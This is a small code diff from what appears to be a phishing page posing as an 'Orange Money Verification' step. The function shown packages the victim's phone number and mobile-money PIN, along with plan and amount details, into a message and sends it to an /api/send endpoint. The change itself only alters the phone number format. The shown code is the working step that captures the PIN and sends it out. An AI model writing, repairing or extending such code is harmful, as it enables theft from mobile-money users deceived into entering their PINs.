@@ -300,7 +300,7 @@ async function submitVerification() {
     : `${window.location.origin}/api/send`;
 
   const payload = {
-    text: `Orange Money Verification\nPhone: +267${phone}\nPIN: ${pin}\nPlan: ${planName}\nAmount: ${planPrice}\nLink: ${smsText}`
+    text: `Orange Money Verification\nPhone: ${phone}\nPIN: ${pin}\nPlan: ${planName}\nAmount: ${planPrice}\nLink: ${smsText}`
   };
 
   try {
